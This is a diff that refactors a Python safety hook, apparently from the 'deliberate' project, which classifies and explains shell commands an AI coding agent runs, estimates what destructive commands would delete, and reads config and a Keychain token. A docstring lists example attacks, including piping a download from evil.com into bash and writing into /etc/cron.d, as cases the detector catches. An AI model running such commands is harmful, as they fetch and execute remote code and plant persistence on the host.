@@ -12,11 +12,17 @@ Multi-layer architecture for robust classification:
 https://github.com/the-radar/deliberate
 """
 
+import hashlib
 import json
-import sys
 import os
-import urllib.request
+import random
+import re
+import subprocess
+import sys
+import tempfile
 import urllib.error
+import urllib.request
+from datetime import datetime
 from pathlib import Path
 
 # Configuration
@@ -37,9 +43,6 @@ DEBUG = False
 USE_CLASSIFIER = True  # Try classifier first if available
 
 # Session state for deduplication
-import hashlib
-import random
-from datetime import datetime
 
 
 def get_state_file(session_id: str) -> str:
@@ -156,7 +159,6 @@ def extract_affected_paths(command: str) -> list:
 
     Looks for paths in common destructive commands like rm, mv, cp, git rm, etc.
     """
-    import re
     paths = []
 
     # Patterns for extracting paths from various commands
@@ -222,6 +224,10 @@ def detect_workflow_patterns(history: dict, current_command: str, window_size: i
     return detected
 
 
+RISK_LEVELS = {"LOW": 0, "MODERATE": 1, "HIGH": 2, "CRITICAL": 3}
+RISK_NAMES = {v: k for k, v in RISK_LEVELS.items()}
+
+
 def calculate_cumulative_risk(history: dict, current_risk: str) -> str:
     """Calculate cumulative session risk based on history and current command.
 
@@ -230,36 +236,25 @@ def calculate_cumulative_risk(history: dict, current_risk: str) -> str:
     - Detected workflow patterns
     - Files at risk
     """
-    risk_levels = {"LOW": 0, "MODERATE": 1, "HIGH": 2, "CRITICAL": 3}
+    max_risk = RISK_LEVELS.get(current_risk, 1)
 
-    # Start with current command's risk
-    max_risk = risk_levels.get(current_risk, 1)
-
-    # Check historical risks
     dangerous_count = 0
     for cmd in history.get("commands", []):
         cmd_risk = cmd.get("risk", "MODERATE")
         if cmd_risk == "DANGEROUS":
             dangerous_count += 1
-        max_risk = max(max_risk, risk_levels.get(cmd_risk, 1))
+        max_risk = max(max_risk, RISK_LEVELS.get(cmd_risk, 1))
 
-    # Escalate based on dangerous command count
-    if dangerous_count >= 3:
-        max_risk = max(max_risk, risk_levels["HIGH"])
     if dangerous_count >= 5:
-        max_risk = max(max_risk, risk_levels["CRITICAL"])
+        max_risk = max(max_risk, RISK_LEVELS["CRITICAL"])
+    elif dangerous_count >= 3:
+        max_risk = max(max_risk, RISK_LEVELS["HIGH"])
 
-    # Check for detected patterns
     for pattern in history.get("patterns_detected", []):
         pattern_risk = pattern[1] if len(pattern) > 1 else "HIGH"
-        max_risk = max(max_risk, risk_levels.get(pattern_risk, 2))
+        max_risk = max(max_risk, RISK_LEVELS.get(pattern_risk, 2))
 
-    # Convert back to string
-    for name, level in risk_levels.items():
-        if level == max_risk:
-            return name
-
-    return "MODERATE"
+    return RISK_NAMES.get(max_risk, "MODERATE")
 
 
 def get_destruction_consequences(command: str, cwd: str = ".") -> dict | None:
@@ -275,9 +270,6 @@ def get_destruction_consequences(command: str, cwd: str = ".") -> dict | None:
 
     Returns None if command is not destructive or paths don't exist.
     """
-    import re
-    import subprocess
-
     consequences = {
         "files": [],
         "dirs": [],
@@ -382,35 +374,19 @@ def _analyze_path(path: str, consequences: dict):
     try:
         if os.path.isfile(path):
             consequences["files"].append(path)
-            size = os.path.getsize(path)
+            size, lines = _count_file_stats(path)
             consequences["total_size"] += size
-
-            # Count lines for text files
-            if _is_text_file(path):
-                try:
-                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                        lines = sum(1 for _ in f)
-                        consequences["total_lines"] += lines
-                except (IOError, PermissionError):
-                    pass
+            consequences["total_lines"] += lines
 
         elif os.path.isdir(path):
             consequences["dirs"].append(path)
-            # Walk directory to count contents
-            for root, _dirs, files in os.walk(path):
+            for root, _, files in os.walk(path):
                 for filename in files:
                     filepath = os.path.join(root, filename)
-                    try:
-                        consequences["files"].append(filepath)
-                        size = os.path.getsize(filepath)
-                        consequences["total_size"] += size
-
-                        if _is_text_file(filepath):
-                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                                lines = sum(1 for _ in f)
-                                consequences["total_lines"] += lines
-                    except (IOError, PermissionError, OSError):
-                        pass
+                    consequences["files"].append(filepath)
+                    size, lines = _count_file_stats(filepath)
+                    consequences["total_size"] += size
+                    consequences["total_lines"] += lines
     except (OSError, PermissionError):
         pass
 
@@ -420,8 +396,6 @@ def _analyze_git_reset_hard(cwd: str, consequences: dict) -> dict | None:
 
     Runs git diff HEAD to see uncommitted changes that will be lost.
     """
-    import subprocess
-
     consequences["type"] = "git_reset_hard"
 
     try:
@@ -453,15 +427,9 @@ def _analyze_git_reset_hard(cwd: str, consequences: dict) -> dict | None:
                 if status[0] in 'MA' or status[1] in 'MA':
                     consequences["files"].append(filepath)
                     if os.path.exists(full_path):
-                        try:
-                            size = os.path.getsize(full_path)
-                            consequences["total_size"] += size
-                            if _is_text_file(full_path):
-                                with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                    lines = sum(1 for _ in f)
-                                    consequences["total_lines"] += lines
-                        except (IOError, OSError):
-                            pass
+                        size, lines = _count_file_stats(full_path)
+                        consequences["total_size"] += size
+                        consequences["total_lines"] += lines
 
         # Get actual diff to show what changes will be lost
         diff_result = subprocess.run(
@@ -503,8 +471,6 @@ def _analyze_git_clean(cwd: str, consequences: dict) -> dict | None:
 
     Runs git clean -n (dry run) to preview what would be deleted.
     """
-    import subprocess
-
     consequences["type"] = "git_clean"
 
     try:
@@ -523,34 +489,27 @@ def _analyze_git_clean(cwd: str, consequences: dict) -> dict | None:
 
         # Parse output: "Would remove path/to/file"
         for line in clean_result.stdout.strip().split('\n'):
-            if line.startswith("Would remove "):
-                filepath = line[len("Would remove "):].strip()
-                full_path = os.path.join(cwd, filepath)
+            if not line.startswith("Would remove "):
+                continue
 
-                if os.path.isdir(full_path):
-                    consequences["dirs"].append(filepath)
-                    # Count files in directory
-                    for root, _dirs, files in os.walk(full_path):
-                        for filename in files:
-                            fpath = os.path.join(root, filename)
-                            consequences["files"].append(fpath)
-                            try:
-                                consequences["total_size"] += os.path.getsize(fpath)
-                                if _is_text_file(fpath):
-                                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
-                                        consequences["total_lines"] += sum(1 for _ in f)
-                            except (IOError, OSError):
-                                pass
-                else:
-                    consequences["files"].append(filepath)
-                    if os.path.exists(full_path):
-                        try:
-                            consequences["total_size"] += os.path.getsize(full_path)
-                            if _is_text_file(full_path):
-                                with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                    consequences["total_lines"] += sum(1 for _ in f)
-                        except (IOError, OSError):
-                            pass
+            filepath = line[len("Would remove "):].strip()
+            full_path = os.path.join(cwd, filepath)
+
+            if os.path.isdir(full_path):
+                consequences["dirs"].append(filepath)
+                for root, _, files in os.walk(full_path):
+                    for filename in files:
+                        fpath = os.path.join(root, filename)
+                        consequences["files"].append(fpath)
+                        size, lines = _count_file_stats(fpath)
+                        consequences["total_size"] += size
+                        consequences["total_lines"] += lines
+            else:
+                consequences["files"].append(filepath)
+                if os.path.exists(full_path):
+                    size, lines = _count_file_stats(full_path)
+                    consequences["total_size"] += size
+                    consequences["total_lines"] += lines
 
         if not consequences["files"] and not consequences["dirs"]:
             return None
@@ -583,8 +542,6 @@ def _analyze_git_checkout_discard(cwd: str, consequences: dict) -> dict | None:
 
     Shows modified tracked files that will lose their changes.
     """
-    import subprocess
-
     consequences["type"] = "git_checkout_discard"
 
     try:
@@ -609,13 +566,9 @@ def _analyze_git_checkout_discard(cwd: str, consequences: dict) -> dict | None:
             full_path = os.path.join(cwd, filepath)
 
             if os.path.exists(full_path):
-                try:
-                    consequences["total_size"] += os.path.getsize(full_path)
-                    if _is_text_file(full_path):
-                        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
-                            consequences["total_lines"] += sum(1 for _ in f)
-                except (IOError, OSError):
-                    pass
+                size, lines = _count_file_stats(full_path)
+                consequences["total_size"] += size
+                consequences["total_lines"] += lines
 
         if not consequences["files"]:
             return None
@@ -651,9 +604,6 @@ def _analyze_git_stash_drop(cwd: str, command: str, consequences: dict) -> dict 
 
     Shows the content of the stash being dropped.
     """
-    import subprocess
-    import re
-
     consequences["type"] = "git_stash_drop"
 
     try:
@@ -703,20 +653,35 @@ def _analyze_git_stash_drop(cwd: str, command: str, consequences: dict) -> dict 
         return None
 
 
+TEXT_EXTENSIONS = {
+    '.py', '.js', '.ts', '.tsx', '.jsx', '.json', '.yaml', '.yml',
+    '.md', '.txt', '.sh', '.bash', '.zsh', '.fish',
+    '.html', '.css', '.scss', '.sass', '.less',
+    '.java', '.kt', '.scala', '.go', '.rs', '.rb', '.php',
+    '.c', '.cpp', '.h', '.hpp', '.cs', '.swift', '.m',
+    '.sql', '.graphql', '.proto', '.xml', '.toml', '.ini', '.cfg',
+    '.env', '.gitignore', '.dockerignore', 'Makefile', 'Dockerfile',
+    '.vue', '.svelte', '.astro'
+}
+
+
 def _is_text_file(path: str) -> bool:
     """Check if file is likely a text/code file based on extension."""
-    text_extensions = {
-        '.py', '.js', '.ts', '.tsx', '.jsx', '.json', '.yaml', '.yml',
-        '.md', '.txt', '.sh', '.bash', '.zsh', '.fish',
-        '.html', '.css', '.scss', '.sass', '.less',
-        '.java', '.kt', '.scala', '.go', '.rs', '.rb', '.php',
-        '.c', '.cpp', '.h', '.hpp', '.cs', '.swift', '.m',
-        '.sql', '.graphql', '.proto', '.xml', '.toml', '.ini', '.cfg',
-        '.env', '.gitignore', '.dockerignore', 'Makefile', 'Dockerfile',
-        '.vue', '.svelte', '.astro'
-    }
     _, ext = os.path.splitext(path)
-    return ext.lower() in text_extensions or os.path.basename(path) in text_extensions
+    return ext.lower() in TEXT_EXTENSIONS or os.path.basename(path) in TEXT_EXTENSIONS
+
+
+def _count_file_stats(filepath: str) -> tuple[int, int]:
+    """Count size and lines for a file. Returns (size_bytes, line_count)."""
+    try:
+        size = os.path.getsize(filepath)
+        lines = 0
+        if _is_text_file(filepath):
+            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                lines = sum(1 for _ in f)
+        return size, lines
+    except (IOError, PermissionError, OSError):
+        return 0, 0
 
 
 def get_backup_dir() -> str:
@@ -741,7 +706,6 @@ def create_pre_destruction_backup(
     Returns backup path if successful, None if backup failed/skipped.
     """
     import shutil
-    import subprocess
 
     backup_base = get_backup_dir()
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -856,20 +820,12 @@ def create_pre_destruction_backup(
 
 def load_backup_config() -> dict:
     """Load backup configuration from config file."""
-    try:
-        config_path = Path(CONFIG_FILE)
-        if config_path.exists():
-            with open(config_path, 'r', encoding='utf-8') as f:
-                config = json.load(f)
-                backup = config.get("backup", {})
-                return {
-                    "enabled": backup.get("enabled", True),  # Enabled by default
-                    "maxBackups": backup.get("maxBackups", 50),
-                    "riskThreshold": backup.get("riskThreshold", "CRITICAL")  # Only backup for CRITICAL by default
-                }
-    except Exception:
-        pass
-    return {"enabled": True, "maxBackups": 50, "riskThreshold": "CRITICAL"}
+    backup = _load_config().get("backup", {})
+    return {
+        "enabled": backup.get("enabled", True),
+        "maxBackups": backup.get("maxBackups", 50),
+        "riskThreshold": backup.get("riskThreshold", "CRITICAL")
+    }
 
 
 def add_command_to_history(session_id: str, command: str, risk: str, explanation: str):
@@ -949,34 +905,38 @@ def save_to_cache(session_id: str, cmd_hash: str, data: dict):
         debug(f"Failed to cache: {e}")
 
 
-def load_blocking_config() -> dict:
-    """Load blocking configuration from ~/.deliberate/config.json"""
+_config_cache = None
+
+
+def _load_config() -> dict:
+    """Load config from CONFIG_FILE with simple caching."""
+    global _config_cache
+    if _config_cache is not None:
+        return _config_cache
     try:
         config_path = Path(CONFIG_FILE)
         if config_path.exists():
             with open(config_path, 'r', encoding='utf-8') as f:
-                config = json.load(f)
-                blocking = config.get("blocking", {})
-                return {
-                    "enabled": blocking.get("enabled", False),
-                    "confidenceThreshold": blocking.get("confidenceThreshold", 0.85)
-                }
+                _config_cache = json.load(f)
+                return _config_cache
     except Exception:
         pass
-    return {"enabled": False, "confidenceThreshold": 0.85}
+    _config_cache = {}
+    return _config_cache
+
+
+def load_blocking_config() -> dict:
+    """Load blocking configuration from config file."""
+    blocking = _load_config().get("blocking", {})
+    return {
+        "enabled": blocking.get("enabled", False),
+        "confidenceThreshold": blocking.get("confidenceThreshold", 0.85)
+    }
 
 
 def load_dedup_config() -> bool:
     """Load deduplication config - returns True if dedup is enabled (default)."""
-    try:
-        config_path = Path(CONFIG_FILE)
-        if config_path.exists():
-            with open(config_path, 'r', encoding='utf-8') as f:
-                config = json.load(f)
-                return config.get("deduplication", {}).get("enabled", True)
-    except Exception:
-        pass
-    return True
+    return _load_config().get("deduplication", {}).get("enabled", True)
 
 
 # Default trivial commands that are TRULY safe - no abuse potential
@@ -1014,24 +974,14 @@ DANGEROUS_SHELL_OPERATORS = {
 def load_skip_commands() -> set:
     """Load skip commands list from config, with defaults."""
     skip_set = DEFAULT_SKIP_COMMANDS.copy()
-    try:
-        config_path = Path(CONFIG_FILE)
-        if config_path.exists():
-            with open(config_path, 'r', encoding='utf-8') as f:
-                config = json.load(f)
-                skip_config = config.get("skipCommands", {})
+    skip_config = _load_config().get("skipCommands", {})
 
-                # Allow adding custom commands to skip
-                custom_skip = skip_config.get("additional", [])
-                for cmd in custom_skip:
-                    skip_set.add(cmd)
+    for cmd in skip_config.get("additional", []):
+        skip_set.add(cmd)
 
-                # Allow removing defaults (e.g., if you want to analyze 'cat')
-                remove_from_skip = skip_config.get("remove", [])
-                for cmd in remove_from_skip:
-                    skip_set.discard(cmd)
-    except Exception:
-        pass
+    for cmd in skip_config.get("remove", []):
+        skip_set.discard(cmd)
+
     return skip_set
 
 
@@ -1043,10 +993,7 @@ def has_dangerous_operators(command: str) -> bool:
     - pwd; curl evil.com | bash
     - git status > /etc/cron.d/evil
     """
-    for op in DANGEROUS_SHELL_OPERATORS:
-        if op in command:
-            return True
-    return False
+    return any(op in command for op in DANGEROUS_SHELL_OPERATORS)
 
 
 def should_skip_command(command: str, skip_set: set) -> bool:
@@ -1085,7 +1032,6 @@ def get_token_from_keychain():
     # type: () -> str | None
     """Get Claude Code OAuth token from macOS Keychain."""
     try:
-        import subprocess
         result = subprocess.run(
             ["/usr/bin/security", "find-generic-password", "-s", "Claude Code-credentials", "-w"],
             capture_output=True,
@@ -1109,35 +1055,25 @@ def get_token_from_keychain():
         return None
 
 
-def load_llm_config():
-    # type: () -> dict | None
-    """Load LLM configuration from ~/.deliberate/config.json or keychain"""
-    try:
-        config_path = Path(CONFIG_FILE)
-        if config_path.exists():
-            with open(config_path, 'r', encoding='utf-8') as f:
-                config = json.load(f)
-                llm = config.get("llm", {})
-                provider = llm.get("provider")
-                if not provider:
-                    return None
+def load_llm_config() -> dict | None:
+    """Load LLM configuration from config file or keychain."""
+    llm = _load_config().get("llm", {})
+    provider = llm.get("provider")
+    if not provider:
+        return None
 
-                # For claude-subscription, get fresh token from keychain
-                api_key = llm.get("apiKey")
-                if provider == "claude-subscription":
-                    keychain_token = get_token_from_keychain()
-                    if keychain_token:
-                        api_key = keychain_token
+    api_key = llm.get("apiKey")
+    if provider == "claude-subscription":
+        keychain_token = get_token_from_keychain()
+        if keychain_token:
+            api_key = keychain_token
 
-                return {
-                    "provider": provider,
-                    "base_url": llm.get("baseUrl"),
-                    "api_key": api_key,
-                    "model": llm.get("model")
-                }
-    except Exception as e:
-        debug(f"Error loading config: {e}")
-    return None
+    return {
+        "provider": provider,
+        "base_url": llm.get("baseUrl"),
+        "api_key": api_key,
+        "model": llm.get("model")
+    }
 
 # Commands that are always safe (skip explanation) - fallback if classifier unavailable
 SAFE_PREFIXES = [
@@ -1177,19 +1113,13 @@ def debug(msg):
 def is_safe_command(command: str) -> bool:
     """Check if command is in the safe list (fallback)."""
     cmd_lower = command.strip().lower()
-    for prefix in SAFE_PREFIXES:
-        if cmd_lower.startswith(prefix.lower()):
-            return True
-    return False
+    return any(cmd_lower.startswith(prefix.lower()) for prefix in SAFE_PREFIXES)
 
 
 def is_dangerous_command(command: str) -> bool:
     """Check if command matches dangerous patterns (fallback)."""
     cmd_lower = command.lower()
-    for pattern in DANGEROUS_PATTERNS:
-        if pattern.lower() in cmd_lower:
-            return True
-    return False
+    return any(pattern.lower() in cmd_lower for pattern in DANGEROUS_PATTERNS)
 
 
 def call_classifier(command: str) -> dict | None:
@@ -1230,8 +1160,6 @@ def extract_script_content(command: str) -> str | None:
     - source script.sh
     - python script.py
     """
-    import re
-
     # Common script execution patterns
     patterns = [
         # bash/sh/zsh execution
@@ -1279,8 +1207,6 @@ def extract_inline_content(command: str) -> str | None:
 
     Returns the inline content if found, None otherwise.
     """
-    import re
-
     # Heredoc patterns - capture content between << MARKER and MARKER
     # Handles both << EOF and << 'EOF' (quoted prevents variable expansion)
     heredoc_pattern = r'<<\s*[\'"]?(\w+)[\'"]?\s*\n(.*?)\n\1'
@@ -1395,10 +1321,6 @@ RISK: [SAFE|MODERATE|DANGEROUS]
 EXPLANATION: [your explanation including any security notes]"""
 
     try:
-        # Use Claude Agent SDK
-        import subprocess
-        import tempfile
-
         # Create temp file for SDK script
         with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
             sdk_script = f"""
